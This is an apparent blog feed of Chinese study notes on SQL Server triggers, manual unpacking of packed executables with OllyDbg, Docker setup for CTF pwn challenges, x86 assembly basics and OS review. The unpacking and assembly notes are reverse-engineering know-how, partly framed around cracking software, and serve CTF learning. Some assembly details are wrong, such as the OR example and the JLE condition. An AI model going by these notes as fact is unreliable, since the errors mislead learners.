href="#删除数据库中用户" class="headerlink" title="删除数据库中用户"></a>删除数据库中用户</h2><pre><code class="mssql">Sp_revokedbaccess &#39;r_test_s1&#39;</code></pre><h2 id="删除数据库角色r-test-s1"><a href="#删除数据库角色r-test-s1" class="headerlink" title="删除数据库角色r_test_s1"></a>删除数据库角色r_test_s1</h2><pre><code class="mssql">EXEC sp_droprolemember &#39;u_test_w1&#39;,&#39;r_test_s1&#39;</code></pre><h2 id="2019-12-4上课笔记"><a href="#2019-12-4上课笔记" class="headerlink" title="2019/12/4上课笔记"></a>2019/12/4上课笔记</h2><pre><code class="sql">use employeeGo if exists(select * from sys.all_objects where        name = &#39;trigger_welcome&#39; and type = &quot;TR&quot;)        Drop trigger trigger_welcomego</code></pre><pre><code class="sql">Create trigger tr_employye on employeefor deleteasdeclare @msg varchar(50)select @msg = str(@@rowcount)+&quot;个员工被删除&quot;select @msgreturn</code></pre><pre><code class="sql">Create Trigger test_tron employee from insert,update,deleteas    select * from inserted    select * from deleted</code></pre><pre><code class="sql">create trigger tri_del_sales2on sotrebakfor delete asdelete sales_bak from deletedwhere deleted.sotr_id = sales_bak.stor_id</code></pre><h2 id="2019-12-11-上课笔记"><a href="#2019-12-11-上课笔记" class="headerlink" title="2019/12/11 上课笔记"></a>2019/12/11 上课笔记</h2><pre><code class="sql">BEGIN TRAN[SACTION]COMMIT TRAN[SACTION]ROLLBACK TRAN[SACTION]</code></pre><h2 id="2019-12-25复习"><a href="#2019-12-25复习" class="headerlink" title="2019/12/25复习"></a>2019/12/25复习</h2><p>判断5分，单选20分，填空20分，简答题10分，综合设计45分</p><p>E-R图什么标志表示实体，属性，关系？     P9</p><p>数据库三级模式体系结构，有利于==数据独立性==</p><blockquote><p>三级模式结构又是什么，为什么可以有利   P6</p><p>模式，内模式，外模式</p><p>模式:对数据库全部数据的数据模式和特征的总体描述</p><p>内模式：存储模式，数据库最低一级逻辑描述</p><p>外模式:用户视图（来源一个或多个表组成的查询表</p></blockquote><p>数据库系统中，用户使用的数据视图用==外模式==描述，该模式是用户与数据库系统之间的接口</p><p>一对一，一对多，多对多举例</p><p>数据库特点：数据共享，数据完整性和数据独立性</p><p>范式分解:减少冗余    范式P27</p><blockquote><p>是什么范式，判断不符合更高范式即可</p><p>1NF：所有属性都不能分解为更基本的数据元素</p><p>2NF：不存在部分函数依赖（某列也能函数决定另一列属性）</p><p>3NF：非传递函数依赖</p></blockquote><p>数据模型三要素：数据结构（二维表），关系操作（选择投影链接），完整性约束</p><p>DBMS、DB、DBS（system，包含人）、DBA</p><table><thead><tr><th>Create</th><th>Insert</th></tr></thead><tbody><tr><td>Alter</td><td>update</td></tr><tr><td>Drop</td><td>Delete</td></tr></tbody></table><p>自然连接：消除重复列</p><p>sql server数据库文件后置：.mdf .ldf .ndf</p><p>windows身份验证，混合身份验证</p><p>存储过程：主动调用</p><p>触发器：根据条件触发</p><p>综合设计：E-R图转换，35分写代码（查询，存储过程，事务，每题6-8分）</p><p>以633开头的7位电话怎么写</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手动脱壳</title>
    <link href="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/"/>
    <url>/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h2><p>可分为压缩壳（常见的有UPX、北斗、ASDPack、Npack、PECompact等）和保护壳（如强壳Safengine、VMprotect、winlicense、Themida等），压缩壳作用是把程序进行体积缩小化处理，保护壳主要作用是混淆或加密代码防止他人进行逆向程序、破解程序。</p><p>注意右面寄存器FPU的显示，当有且只有ESP和EIP为红色时，我们可以用ESP定律了</p><p><a href="https://baike.baidu.com/item/esp%E5%AE%9A%E5%BE%8B/840881?fr=aladdin#1" target="_blank" rel="noopener">ESP定律</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/6213852.html" target="_blank" rel="noopener">参考</a></p><h3 id="nsPack"><a href="#nsPack" class="headerlink" title="nsPack"></a>nsPack</h3><p>还要找到OEP，所谓的OEP，意即程序的入口点，可以用OD载入，不分析代码。</p><p>首先已知是nSPack壳，直接用OD打开，发现pushfd和pushad两句关键句：==win下的吾爱破解版od可==<img src="2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143025540.png" srcset="/img/loading.gif" class="" title="image-20190820143025540"></p><p>ESP定律的落脚点，可以看到落脚点下面一行就是一个大跳转，继续F8</p><img src="2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143113466.png" srcset="/img/loading.gif" class="" title="image-20190820143113466"><img src="2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143126509.png" srcset="/img/loading.gif" class="" title="image-20190820143126509"><img src="2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143150130.png" srcset="/img/loading.gif" class="" title="image-20190820143150130"><img src="2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143211831.png" srcset="/img/loading.gif" class="" title="image-20190820143211831">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用docker为pwn题目搭配环境</title>
    <link href="/2020/01/13/%E4%BD%BF%E7%94%A8docker%E4%B8%BApwn%E9%A2%98%E7%9B%AE%E6%90%AD%E9%85%8D%E7%8E%AF%E5%A2%83/"/>
    <url>/2020/01/13/%E4%BD%BF%E7%94%A8docker%E4%B8%BApwn%E9%A2%98%E7%9B%AE%E6%90%AD%E9%85%8D%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="为pwn题目搭配环境-docker"><a href="#为pwn题目搭配环境-docker" class="headerlink" title="为pwn题目搭配环境-docker"></a>为pwn题目搭配环境-docker</h1><h2 id="将多个题目搭建一个docker里"><a href="#将多个题目搭建一个docker里" class="headerlink" title="将多个题目搭建一个docker里"></a>将多个题目搭建一个docker里</h2><p>ubuntu *1 </p><p>docker <a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">安装</a></p><p>docker-compose <a href="https://docs.docker.com/compose/install/" target="_blank" rel="noopener">官方文档</a></p><p><a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="noopener">giantbranch/pwn_deploy_chroot</a></p><p><a href="https://blog.csdn.net/xiojing825/article/details/79494408" target="_blank" rel="noopener">解决 ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</a></p><p><a href="https://www.awaimai.com/2587.html" target="_blank" rel="noopener">docker-compose up解决错误ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</a></p><blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>将题目放到bin目录中</p><p>然后在config.py，将REPLACE_BINSH设置为False</p><p>运行一次python initialize.py</p><p>然后会出现一个flags.txt（如果想替换flag，就直接修改flag.txt里的flag字符串即可，然后运行一次python initialize.py）</p><p>然后运行 docker-compose up -build -d</p><p>开启题目即可</p><p>注意：若出现libstdc++.so.6找不到的情况，说明C++环境没有配好，只需要在已经配好C++环境的同版本ubuntu下找到libstdc++.so.6.0.XX（XX为数字）和libgcc_s.so.1放到pwn_deploy_chroot目录下，然后在dockerfile里加入一下代码</p><pre><code>COPY ./libstdc++.so.6.0.21 /usr/lib/libstdc++.so.6COPY ./libgcc_s.so.1 /usr/lib/libgcc_s.so.1</code></pre><p>来源:<a href="https://196011564.github.io/2019/07/22/Linux-简单PWN搭建/?tdsourcetag=s_pctim_aiomsg#找到Pwn所在的端口" target="_blank" rel="noopener">咲夜南梦</a></p></blockquote><p>停止容器 docker stop name</p><h2 id="一个题目一个docker"><a href="#一个题目一个docker" class="headerlink" title="一个题目一个docker"></a>一个题目一个docker</h2><p><a href="https://github.com/glzjin/base_pwn_xinetd" target="_blank" rel="noopener">ubuntu16</a></p><p><a href="https://github.com/glzjin/base_pwn_xinetd_kafel_1804" target="_blank" rel="noopener">ubuntu18</a></p><p>一般情况下，使用赵师傅Ubuntu18.04环境的docker镜像</p><p>下载下来之后，删除除了文件夹：src，文件：docker-compose.yml，Dockerfile以外的所有文件，并复制多个以供其它题目使用</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编、逆向工程基础</title>
    <link href="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>原文链接：<a href="https://blog.csdn.net/qq_21508727/article/details/80559270" target="_blank" rel="noopener">https://blog.csdn.net/qq_21508727/article/details/80559270</a></p><h2 id="单位"><a href="#单位" class="headerlink" title="单位"></a>单位</h2><blockquote><ol><li>·WORD（字） - 一个字由两个字节组成，共有16位。一个字的最大值是0FFFFh (或者是 65535d) (h代表16进制，d代表10进制)。</li><li>·DOUBLE WORD（双字DWORD） - 一个双字包含两个字，共有32位。最大值为0FFFFFFFF (或者是 4294967295d)。</li></ol><blockquote><p>一个16进制占4bit</p></blockquote></blockquote><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>Win+Intel CPU组成的计算机通常有9个32位寄存器 (w/o 标志寄存器)。它们是：</p><blockquote><ol><li>EAX： 累加器</li><li>EBX： 基址寄存器</li><li>ECX： 计数器</li><li>EDX： 数据寄存器</li><li>ESI： 源变址寄存器</li><li>EDI： 目的变址寄存器</li><li>EBP： 扩展基址指针寄存器</li><li>ESP： 栈指针寄存器</li><li>EIP： 指令指针寄存器</li></ol><blockquote><p>==大小都是4个字节==</p><blockquote><ol><li><p>EBP： EBP在栈中运用最广，刚开始没有什么需要特别注意的 ;) </p></li><li><p>ESP： ESP指向栈区域的栈顶位置。栈是一个存放即将会被用到的数据的地方，你可以去搜索一下push/pop 指令了解更多栈知识。 </p></li><li><p>EIP： EIP指向下一个将会被执行的指令。</p></li></ol><hr><p><strong>栈（stack）：后进先出的数据结构</strong>     </p><p><strong>堆（heap）：经过排列的树形数据结构，通常指二叉堆，存取是随意的</strong></p></blockquote></blockquote></blockquote><p>有一些寄存器是16位甚至8位的，是不能直接寻址的。</p><blockquote><img src="2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/1565342053303.png" srcset="/img/loading.gif" class="" width="1565342053303"></blockquote><p>一个寄存器可以这样看：</p><img src="2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/1565342088084.png" srcset="/img/loading.gif" class="" width="1565342088084"><p>EAX是名字，AX是低16位部分，又分为低8位AL，高8位AH</p><p><strong>了解：</strong></p><p>i.单字节（8位）寄存器：</p><blockquote><ol><li>AL and AH</li><li>BL and BH</li><li>CL and CH</li><li>DL and DH</li></ol></blockquote><p>ii.单字（16位）寄存器：这些寄存器大小为一个字（=2字节=16位）。一个单字寄存器包含两个单字节寄存器。通常根据功能区分</p><p>1.通用寄存器:</p><blockquote><ol><li>AX (单字=16位) = AH + AL -&gt; 其中‘+’号并不代表把它们代数相加。AH和AL寄存器是相互独立的，只不过都是AX寄存器的一部分，所以你改变AH或AL (或者都改变) ，AX寄存器也会被改变。 </li><li>-&gt; ‘accumulator’(累加器)：用于进行数学运算</li><li>BX -&gt; ‘base’(基址寄存器)：用来连接栈(之后会说明)</li><li>CX -&gt; ‘counter’(计数器)：</li><li>DX -&gt; ‘data’(数据寄存器)：大多数情况下用来存放数据</li><li>DI -&gt; ‘destination index’(目的变址寄存器): 例如将一个字符串拷贝到DI</li><li>SI -&gt; ‘source index’(源变址寄存器): 例如将一个字符串从SI拷贝</li></ol></blockquote><p>2.索引寄存器（指针寄存器）:</p><blockquote><ol><li>BP -&gt; ‘base pointer’(基址指针寄存器)：表示栈区域的基地址</li><li>SP -&gt; ‘stack pointer’(栈指针寄存器)：表示栈区域的栈顶地址</li></ol></blockquote><p>3.段寄存器：</p><blockquote><ol><li>CS -&gt; ‘code segment’(代码段寄存器)：用于存放应用程序代码所在段的段基址(之后会说明)</li><li>DS -&gt; ‘data segment’(数据段寄存器)：用于存放数据段的段基址(以后会说明)</li><li>ES -&gt; ‘extra segment’(附加段寄存器)：用于存放程序使用的附加数据段的基地址</li><li>SS -&gt; ‘stack segment’(栈段寄存器)：用于存放栈段的段基址(以后会说明)</li></ol></blockquote><p>4.指令指针寄存器：</p><blockquote><p>IP -&gt; ‘instruction pointer’(指令指针寄存器)：指向下一个指令 ;)</p></blockquote><p>iii. 双字(32位)寄存器：</p><p>2 字= 4 字节= 32 位， EAX、EBX、ECX、EDX、EDI…… </p><p>如果16位寄存器前面加了‘E’，就代表它们是32位寄存器。例如，AX=16位，EAX=32位。</p><h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><p>32位的CPU中有32个不同的标志寄存器，只关心期中三个：ZF、OF、CF。标志寄存器是一个标志，==只能是0或者1，决定了是否要执行某个指令==，可以知道程序在这一步是否会跳转。</p><h3 id="Z-Flag（零标志）"><a href="#Z-Flag（零标志）" class="headerlink" title="Z-Flag（零标志）"></a>Z-Flag（零标志）</h3><p>ZF是破解中用的最多的寄存器（通常90%）。若上一个运算结果为0，则值为1，否则为0。</p><h3 id="The-O-Flag（溢出标志）"><a href="#The-O-Flag（溢出标志）" class="headerlink" title="The O-Flag（溢出标志）"></a>The O-Flag（溢出标志）</h3><p>OF占约4%，若上一步改变了某寄存器的最高有效位，则会被设置为1。操作产生溢出时也会被设置为1。</p><h3 id="The-C-Flag（进位标志）"><a href="#The-C-Flag（进位标志）" class="headerlink" title="The C-Flag（进位标志）"></a>The C-Flag（进位标志）</h3><p>CF占1%，产生溢出，就会被设置为1。</p><h2 id="段偏移"><a href="#段偏移" class="headerlink" title="段偏移"></a>段偏移</h2><p>内存中的一个段储存了指令（CS）、数据（DS）、堆栈（SS）或者其他段（ES）。每一个段都有一个偏移量，在32位应用程序下，这些偏移量由00000000到FFFFFFFF。段和偏移量的标准形式如下：</p><blockquote><p>段：偏移量 = 把它们放在一起就是内存中一个具体的地址。</p><p>比喻：一个段是一本书的某一页；偏移量是一页的某一行。</p></blockquote><h2 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h2><p><strong>内存中的栈区处于相对较高的地址以地址的增长方向为上的话，栈地址是向下增长的。</strong></p><p>栈中分配局部变量空间，堆区是向上增长的用于分配程序员申请的内存空间。另外还有静态区是分配静态变量，全局变量空间的；只读区是分配常量和程序代码空间的；以及其他一些分区。</p><blockquote><p>PUSH 命令是向栈中压入数据，POP命令就是从栈中取出最后放入的数据并且把它存进具体的寄存器中。</p></blockquote><h3 id="1、堆和栈申请和回收方式不同"><a href="#1、堆和栈申请和回收方式不同" class="headerlink" title="1、堆和栈申请和回收方式不同"></a>1、堆和栈申请和回收方式不同</h3><ul><li>栈：由系统自动分配空间，自动回收</li><li>堆：由程序员自己申请空间，不释放就可以一直访问</li></ul><h3 id="2、申请后系统响应"><a href="#2、申请后系统响应" class="headerlink" title="2、申请后系统响应"></a>2、申请后系统响应</h3><ul><li>栈：只要栈剩余空间,就自动分配空间，否则提示栈溢出</li><li>堆：==操作系统有一个记录空闲内存地址的链表==，系统收到空间申请会遍历该链表，寻找第一个大于申请空间的结点。并将结点从空闲结点链表删除，将空间分配给程序。==在这块内存空间的首地址会记录分配空间的大小，所以delete才能正确释放空间。==多余空间会放回空闲链表。 </li></ul><h3 id="3、堆申请效率比栈低"><a href="#3、堆申请效率比栈低" class="headerlink" title="3、堆申请效率比栈低"></a>3、堆申请效率比栈低</h3><h3 id="4、申请大小的限制"><a href="#4、申请大小的限制" class="headerlink" title="4、申请大小的限制"></a>4、申请大小的限制</h3><ul><li>栈：Win下，栈是==连续的内存区域==，==向低地址扩展的数据结构。栈顶地址和栈的最大容量是系统预先规定好的。==Win下栈大小为1M，申请空间超出剩余会提示overflow。</li><li>堆：向高地址拓展的数据结构，不连续的内存区域。（因为用链表储存）<strong>链表遍历从低地址到高地址。</strong>堆的大小受限于计算机系统中有效的虚拟内存。</li></ul><h3 id="5、堆和栈中的存储内容"><a href="#5、堆和栈中的存储内容" class="headerlink" title="5、堆和栈中的存储内容"></a>5、堆和栈中的存储内容</h3><ul><li>栈大小有限，用子函数有物理意义（？？？）</li><li>栈：调用函数时，第一个进栈的是主函数中函数调用后的下一条指令（下一条可执行语句）==的地址==，然后是函数的各个参数，在大多数C编译器中，参数是由右往左入栈的，然后是函数中的局部变量。==静态变量不入栈。==</li></ul><p>==调用结束后，局部变量先出栈，然后是参数，最后栈顶指向最开始存的地址，也就是主函数中的下一条指令，程序由该点继续运行==</p><ul><li>堆:一般是在堆的头部用一个字节存放堆的大小。堆中具体内容由程序员安排。</li></ul><h3 id="6、存取效率的比较"><a href="#6、存取效率的比较" class="headerlink" title="6、存取效率的比较"></a>6、存取效率的比较</h3><pre><code class="cpp">char s1[] = &quot;aaaaaaaaaaaaaaa&quot;; char *s2 = &quot;bbbbbbbbbbbbbbbbb&quot;; </code></pre><p>aaaaaaaaaaa是在运行时刻赋值的；（字符数组有连续空间存放值）放在栈中。<br>而bbbbbbbbbbb是在编译时就确定的；（只有4字节的空间用于存放地址）放在堆中。<br>==在以后的存取中，在栈上的数组比指针所指向的字符串(例如堆)快==</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>==所有值通常以16进制形式储存的。==</p><p>大部分指令有两个操作符（例如add EAX,EBX）,有些是一个（例如not EAX），还有一些是三个操作符（例如IMUL EAX，EDX，64）。如果使用“DWORD PTR [XXX]”就表示使用了内存中偏移量为XXX的数据。<strong>Win+Intel的电脑大多采用“低尾端法”，所以字节在内存中储存方式是倒过来的。</strong></p><blockquote><p>大部分有两个操作符的指令都是以下这种格式（以add举例）</p><pre><code>add eax,ebx                           寄存器, 寄存器add eax,123                           寄存器, 数值add eax,dword ptr [404000]            寄存器, Dword  指针 [数值]add eax,dword ptr [eax]               寄存器, Dword  指针 [寄存器值]add eax,dword ptr [eax+00404000]      寄存器, Dword  指针 [寄存器值+数值]add dword ptr [404000],eax            Dword 指针[数值], 寄存器add dword ptr [404000],123            Dword 指针[数值], 数值add dword ptr [eax],eax               Dword 指针[寄存器值], 寄存器add dword ptr [eax],123               Dword 指针[寄存器值], 数值add dword ptr [eax+404000],eax        Dword 指针[寄存器值+数值], 寄存器add dword ptr [eax+404000],123        Dword 指针[寄存器值+数值], 数值</code></pre></blockquote><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>ADD 被加数，加数</p><p>将一个数值加在一个寄存器上或者一个内存地址上。</p><p>add eax,123 == eax = eax +123</p><p>加法指令对ZF，OF，CF都有影响</p><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>AND 目标数，原数</p><p>AND运算对两个数进行逻辑与运算。</p><p>会清空OF,CF标记，设置ZF标记。</p><h3 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h3><blockquote><p>CALL 404000                 最常见: CALL 地址<br>CALL EAX                    CALL 寄存器 - 如果寄存器存的值为404000，那就等同于第一种情况<br>CALL DWORD PTR [EAX]        CALL [EAX]偏移量所指向的地址<br>CALL DWORD PTR [EAX+5]      CALL [EAX+5]偏移量所指向的地址</p></blockquote><h3 id="CDQ"><a href="#CDQ" class="headerlink" title="==CDQ=="></a>==CDQ==</h3><p>通常出现在除法前面，将EDX的所有位变成EAX最高位的值</p><p>比如当EAX&gt;=80000000h时，其二进制最高位为1，则EDX被32位全赋值为1，即FFFFFFFF</p><p>若EAX&lt;80000000，则其二进制最高位为0，EDX为00000000。</p><p>然后将EDX：EAX组成新数(64位)：FFFFFFFF 80000000</p><h3 id="CMP（compare）"><a href="#CMP（compare）" class="headerlink" title="CMP（compare）"></a>CMP（compare）</h3><p>CMP 目标数，原数</p><p>比较两个值并且标记CF、OF、ZF:</p><blockquote><p>CMP     EAX, EBX               比较eax和ebx是否相等，如果相等就设置ZF为1<br>CMP     EAX,[404000]           比较eax和偏移量为[404000]的值是否相等<br>CMP     [404000],EAX           比较[404000]是否与eax相等</p></blockquote><h3 id="DEC-decrease"><a href="#DEC-decrease" class="headerlink" title="DEC(decrease)"></a>DEC(decrease)</h3><p>DEC something</p><p>自减</p><blockquote><p>dec eax                              eax自减1<br>dec [eax]                            偏移量为eax的值自减1<br>dec [401000]                         偏移量为401000的值自减1<br>dec [eax+401000]                     偏移量为eax+401000的值自减1</p></blockquote><p>可以标记ZF、OF</p><h3 id="DIV（division除）"><a href="#DIV（division除）" class="headerlink" title="DIV（division除）"></a>DIV（division除）</h3><p>DIV 除数</p><p>无符号除法</p><p>DIV指令用来将EAX除以除数（无符号除法），被除数通常是EAX，结果也储存在EAX中，而被除数对除数取的模存在除数中。</p><blockquote><p>mov eax,64                       EAX = 64h = 100<br>mov ecx,9                        ECX = 9<br>div ecx                          EAX除以ECX</p></blockquote><p>EAX = 100/9 = 0B(11)并且ECX = 100 MOD 9 = 1</p><p>可以标记CF、OF、ZF</p><h3 id="IDIV（整除）"><a href="#IDIV（整除）" class="headerlink" title="IDIV（整除）"></a>IDIV（整除）</h3><p>IDIV 除数</p><p>有符号除法</p><p>执行方法同div一样</p><h3 id="INC（increase）"><a href="#INC（increase）" class="headerlink" title="INC（increase）"></a>INC（increase）</h3><p>自加</p><p>可以标记ZF、OF</p><p><strong>INT</strong></p><p>语法: int 目标数</p><p>INT 的目标数必须是产生一个整数(例如：int 21h)，类似于call调用函数，INT指令是调用程序对硬件控制，不同的值对应着不同的功能。</p><p>具体参照硬件说明书。</p><p><strong>JUMPS</strong></p><p>这些都是最重要的跳转指令和触发条件(重要用<em>标记，最重要用*</em>标记)：</p><pre><code>指令                条件                    条件JA*          -    如果大于就跳转(无符号)      - CF=0 and ZF=0JAE          -    如果大于或等于就跳转(无符号)- CF=0JB*          -    如果小于就跳转(无符号)   - CF=1JBE          -    如果小于或等于就跳转(无符号)- CF=1 or ZF=1JC           -    如果CF被标记就了跳转       - CF=1JCXZ         -    如果CX等于0就跳转      - CX=0JE**         -    如果相等就跳转        - ZF=1JECXZ        -    如果ECX等于0就跳转       - ECX=0JG*          -    如果大于就跳转(有符号)   - ZF=0 and SF=OF (SF = Sign Flag)JGE*         -    如果大于或等于就跳转(有符号) - SF=OFJL*          -    如果小于就跳转(有符号)    - SF != OF (!= is not)JLE*         -    如果小于或等于就跳转(有符号 - ZF=1 and OF != OFJMP**        -    跳转             - 强制跳转JNA          -    如果不大于就跳转(无符号)   - CF=1 or ZF=1JNAE         -    如果不大于等于就跳转(无符号) - CF=1JNB          -    如果不小于就跳转(无符号)   - CF=0JNBE         -    如果不小于等于就跳转(无符号) - CF=0 and ZF=0JNC          -    如果CF未被标记就跳转     - CF=0JNE**        -    如果不等于就跳转       - ZF=0JNG          -    如果不大于就跳转(有符号)   - ZF=1 or SF!=OFJNGE         -    如果不大于等于就跳转(有符号) - SF!=OFJNL          -    如果不小于就跳转(有符号)   - SF=OFJNLE         -    如果不小于等于就跳转(有符号) - ZF=0 and SF=OFJNO          -    如果OF未被标记就跳转     - OF=0JNP          -    如果PF未被标记就跳转     - PF=0JNS          -    如果SF未被标记就跳转      - SF=0JNZ          -    如果不等于0就跳转      - ZF=0JO           -    如果OF被标记就跳转     - OF=1JP           -    如果PF被标记就跳转     - PF=1JPE          -    如果是偶数就跳转       - PF=1JPO          -    如果是奇数就跳转       - PF=0JS           -    如果SF被标记就跳转     - SF=1JZ           -    如果等于0就跳转      - ZF=1</code></pre><p><strong>LEA (有效地址传送)</strong></p><p>语法：LEA 目的数、源数</p><p>LEA可以看成和MOV差不多的指令LEA ，它本身的功能并没有被太广泛的使用，反而广泛运用在快速乘法中：</p><p>lea eax，dword ptr [4*ecx+ebx]</p><p>将eax赋值为 4*ecx+ebx</p><p><strong>MOV (传送)</strong></p><p>语法: MOV 目的数,源数</p><p>这是一个很简单的指令，MOV指令将源数赋值给目的数，并且源数值保持不变</p><p>这里有一些MOV的变形：</p><p>MOVS/MOVSB/MOVSW/MOVSD EDI, ESI：这些变形能将ESI指向的内容传送到EDI指向的内容中去</p><p>MOVSX：MOVSX指令将单字或者单字节扩展为双字或者双字节传送，原符号不变</p><p>MOVZX：MOVZX扩展单字节或单字为双字节或双字并且用0填充剩余部分(通俗来说就是将源数取出置于目的数，其他位用0填充)</p><p><strong>MUL (multiply乘法)</strong></p><p>语法：MUL 数值</p><p>这个指令同IMUL一样，不过MUL可以乘无符号数。</p><p><strong>NOP (无操作)</strong></p><p>语法：NOP</p><p>这个指令说明不做任何事</p><p>所以它在逆向中运用范围最广</p><p><strong>OR (逻辑或)</strong></p><p>语法：OR 目的数,源数</p><p>OR指令对两个值进行逻辑或运算</p><p>这个指令会清空OF、CF标记，设置ZF标记</p><p>为了更好的理解OR，思考下面二进制串:</p><pre><code>10010101100101001101</code></pre><p>如果对它们进行逻辑与运算，结果将是1101011111。</p><p>只有当两边同为0时其结果为0，否则就为1。你可以用计算器尝试计算。希望你能理解为什么，最好自己动手算一算</p><p><strong>POP</strong></p><p>语法：POP 目的地址</p><p>POP指令将栈顶第一个字传送到目的地址。 每次POP后，ESP(栈指针寄存器)都会增加以指向新栈顶</p><p><strong>PUSH</strong></p><p>语法：PUSH 值</p><p>PUSH是POP的相反操作，它将一个值压入栈并且减小栈顶指针值以指向新栈顶。</p><p><strong>REP/REPE/REPZ/REPNE/REPNZ</strong></p><p>语法: REP/REPE/REPZ/REPNE/REPNZ ins</p><p>重复上面的指令：直到CX=0。ins必须是一个操作符，比如CMPS、INS、LODS、MOVS、OUTS、SCAS 或 STOS</p><p><strong>RET (return返回)</strong></p><p>语法：RET</p><p>RET digit</p><p>RET指令的功能是从一个代码区域中退出到调用CALL的指令处。</p><p>RET digit在返回前会清理栈</p><p><strong>SUB (减)</strong></p><p>语法：SUB 目的数,源数</p><p>SUB与ADD相反，它将源数减去目的数，并将结果储存在目的数中</p><p>SUB可以标记ZF、OF、CF</p><p><strong>TEST</strong></p><p>语法：TEST 操作符、操作符</p><p>这个指令99%都是用于”TEST EAX, EAX”，它执行与AND相同的功能，但是并不储存数据。如果EAX=0就会标记ZF，如果EAX不是0，就会清空ZF</p><p><strong>XOR</strong></p><p>语法：XOR 目的数,源数</p><p>XOR指令对两个数进行异或操作</p><p>这个指令清空OF、CF，但会标记ZF</p><p>为了更好的理解，思考下面的二进制串：</p><pre><code>10010101100101001101</code></pre><p>如果异或它们，结果将是1100011011</p><p>如果两个值相等，则结果为0，否则为1。</p><p>很多情况下我们会使用”XOR EAX, EAX”，这个操作是将EAX赋值为0，因为当一个值异或其自身，就过都是0。你最好自己动手尝试下，这样可以帮助你理解得更好</p><h3 id="MOV"><a href="#MOV" class="headerlink" title="MOV"></a>MOV</h3><p>==MOV AX , 2000H 将2000H传给AX==</p><h3 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h3><img src="2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/Snipaste_2019-08-12_22-36-43.jpg" srcset="/img/loading.gif" class="" title="Snipaste_2019-08-12_22-36-43"><h2 id="MIPS汇编"><a href="#MIPS汇编" class="headerlink" title="MIPS汇编"></a>MIPS汇编</h2><p><a href="https://www.cnblogs.com/thoupin/p/4018455.html" target="_blank" rel="noopener">link</a></p><p>xori 异或</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>操作系统复习</title>
    <link href="/2020/01/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/"/>
    <url>/2020/01/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="对不起我看吐了，考炸了"><a href="#对不起我看吐了，考炸了" class="headerlink" title="对不起我看吐了，考炸了"></a><strong>对不起我看吐了，考炸了</strong></h2><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="操作系统的目标"><a href="#操作系统的目标" class="headerlink" title="操作系统的目标"></a>操作系统的目标</h2><p><strong>方便性，有效性，可扩充性和开放性</strong></p><p>可扩充性：采用微内核结构 P30</p><h3 id="发展主要动力"><a href="#发展主要动力" class="headerlink" title="发展主要动力"></a>发展主要动力</h3><ul><li>不断提高计算机资源利用率</li><li>方便用户</li><li>器件的更新换代</li><li>体系结构的发展</li><li>新的应用需求</li></ul><h3 id="多道程序设计的基本概念"><a href="#多道程序设计的基本概念" class="headerlink" title="多道程序设计的基本概念"></a>多道程序设计的基本概念</h3><p>利用I/O操作的空闲时间，调度B程序运行，B空闲调度C等    P8</p><h4 id="优缺点"><a href="#优缺点" class="headerlink" 